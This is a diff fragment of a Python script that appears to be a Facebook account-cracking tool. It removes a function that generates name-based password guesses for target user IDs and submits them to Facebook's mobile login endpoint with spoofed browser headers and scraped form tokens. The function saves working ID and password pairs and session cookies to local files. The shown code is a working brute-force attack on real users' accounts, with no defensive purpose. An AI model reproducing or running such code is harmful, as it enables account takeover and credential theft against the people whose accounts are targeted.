@@ -1448,62 +1448,7 @@ def ffb6(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 		
-def ffb9(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write(f"\r{bo} [GS-XD] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'm.facebook.com',
-'viewport-width': '980',
- 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
- 'sec-ch-ua-mobile': '?0',
- 'sec-ch-ua-platform': '"Linux"',
- 'sec-ch-prefers-color-scheme': 'light',
- 'dnt': '1', 
- 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
- 'upgrade-insecure-requests': '1', 
- 'user-agent': ua, 
- 'sec-fetch-site': 'none',
- 'sec-fetch-mode': 'navigate',
- 'sec-fetch-user': '?1', 
- 'sec-fetch-dest': 'document',
- 'accept-encoding': 'gzip, deflate, br',
- 'accept-language': 'en-US,en;q=0.9',}
-			getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			AXI=session.cookies.get_dict().keys()
-			if "c_user" in AXI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print(f'\r\r\x1b[38;5;46m[GS-OK] '+idf+ ' | '+pw+'')
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in AXI:
-				if 'y' in pcp:
-					print(f'\r \x1b[1;91m[BLADE-CP] {idf} | {pw}')     
-					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-	
+
 def menu_apikey():  
   uuid = str(os.geteuid()) + str(os.getlogin()) + str(os.getlogin()) +str(os.geteuid())
   id = "ꙶꙶꙶͯͯᷓͮͭͦͧͨᷓᷓ".join(uuid)
